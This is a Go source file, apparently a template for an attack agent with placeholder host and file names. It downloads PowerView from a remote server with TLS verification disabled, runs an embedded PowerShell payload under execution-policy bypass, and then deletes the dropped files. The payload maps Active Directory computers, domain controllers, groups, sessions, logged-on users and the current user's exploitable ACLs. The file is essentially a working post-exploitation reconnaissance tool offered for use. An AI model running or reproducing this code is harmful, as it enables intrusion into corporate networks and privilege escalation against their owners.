package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var TempDir = "C:\\Temp"

func GETHELPER(helper string, filePath string) error {
	jobUuid := os.Args[1]
	req, err := http.NewRequest("GET", "https://HOST:PORT/helpers/"+jobUuid+"/"+helper, nil)
	if err != nil {
		return err
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return err
	}
	err = WRITETOFILE(filePath, string(respBody))
	if err != nil {
		return err
	}
	return nil
}

func WRITETOFILE(filePath string, data string) error {
	err := os.MkdirAll(TempDir, os.ModePerm)
	if err != nil {
		return err
	}
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return err
	}
	return file.Sync()
}

func RUNPOWERVIEW() {
	var PowerViewFullPath = TempDir + "\\" + "POWERVIEWFILENAME.ps1"
	err := GETHELPER("PowerView.ps1", PowerViewFullPath)
	if err != nil {
		fmt.Println(err)
	}
	powershellPayload := `
Import-Module C:\Temp\POWERVIEWFILENAME.ps1

$Output = @{}
$Output.add("Computers", @())
$Output.add("DCs", @())
$Output.add("Groups", @())
$Output.add("OUs", @())
$Output.add("LocalSessions", @())
$Output.add("RemoteSessions", @())
$Output.add("LocalLoggedOn", @())
$Output.add("RemoteLoggedOn", @())
$Output.add("ACLs", @())
$Output.add("ACEs", @())

$Computers = Get-NetComputer
if ($Computers.Length -ne 0) {
Write-Output "Found computers"
$Output["Computers"] += $Computers
} else {
Write-Output "Something wrong. Computers not found."
}

$DCs = Get-NetDomainController | Select Name
if ($DCs.Length -ne 0) {
Write-Output "Found DCs"
$Output["DCs"] += $DCs
} else {
Write-Output "Something wrong. DCs not found."
}

$Domain = Get-NetDomain | Select Forest
if ($Domain.Length -ne 0) {
Write-Output "Found domain"
$Output.add("Domain", $Domain)
} else {
Write-Output "Something wrong. Domain not found."
}

$Groups = Get-NetGroup
if ($Groups.Length -ne 0) {
Write-Output "Found groups"
$Output["Groups"] += $Groups
} else {
Write-Output "Something wrong. Groups not found."
}

$DomainSID = Get-DomainSID
if ($DomainSID.Length -ne 0){
Write-Output "Found domain SID"
$Output.add("Domain-SID", $DomainSID)
} else {
Write-Output "Something wrong. Domain SID not found."
}

$OUs = Get-NetOU
if ($OUs.Length -ne 0){
Write-Output "Found OUs"
$Output["OUs"] += $OUs
} else {
Write-Output "Something wrong. Domain SID not found."
}

Write-Output "Trying to dump all active session"
$localSessions = Get-NetSession
$Output["LocalSessions"] += $localSessions
$Computers | ForEach-Object { 
$ComputerName = $_.dnshostname
$Sessions = Get-NetSession -ComputerName $ComputerName
if ($Sessions.Length -ne 0) {
Write-Output "Found sessions on $ComputerName"
$Output["RemoteSessions"] += $Sessions
} else {
Write-Output "Sessions on $ComputerName not found"
}
}

Write-Output "Trying to dump who is logged on"
$localLoggedOn = Get-NetLoggedon
$Output["LocalLoggedOn"] += $localLoggedOn
$Computers | ForEach-Object {
$ComputerName = $_.dnshostname
$LoggedOn = Get-NEtLoggedon -ComputerName $ComputerName
if ($LoggedOn.Length -ne 0) {
Write-Output "Found logged on users on $ComputerName."
$Output["RemoteLoggedOn"] += $LoggedOn
} else {
Write-Output "Logged on users on $ComputerName not found"
}
}

Write-Output "Trying to check ACL of a current user over other objects in the domain"
$userSid = Convert-NameToSid (whoami)
$ACLs = (Get-ObjectAcl -ResolveGUIDs -Identity * |? {$_.SecurityIdentifier -eq $userSid -and ($_.ActiveDirectoryRights -like "*Generic*" -or $_.ActiveDirectoryRights -like "*Write*" -or $_.ActiveDirectoryRights -like "*Read*")})
if ($ACLs.Length -ne 0) {
Write-Output "Found some interesting ACL"
$Output["ACLs"] += $ACLs
} else {
Write-Output "Interesting ACLs for the user $userSid not found"
}

Write-Output "Trying to check ACE of a current user over other objects in the domain"
$userSid = Convert-NameToSid (whoami)
$ACEs = (Get-ObjectAcl -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $userSid -and ($_.ActiveDirectoryRights -eq "ExtendedRight")})
if ($ACEs.Length -ne 0) {
Write-Output "Found some interesting ACE"
$Output["ACEs"] += $ACEs
} else {
Write-Output "Interesting ACEs for the user $userSid not found"
}

Write-Output "Result in JSON:"
Write-Output $Output | ConvertTo-Json
`
	var PowerShellPayloadFullPath = TempDir + "\\" + "SCRIPTFILENAME.ps1"
	err = WRITETOFILE(PowerShellPayloadFullPath, powershellPayload)
	if err != nil {
		fmt.Printf("%s\n", err)
	}
	powershellOut, err := exec.Command("powershell", "-ep", "bypass", PowerShellPayloadFullPath).Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(powershellOut))
	err = os.Remove(PowerViewFullPath)
	if err != nil {
		fmt.Println(err)
	}
	err = os.Remove(PowerShellPayloadFullPath)
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	RUNPOWERVIEW()
}
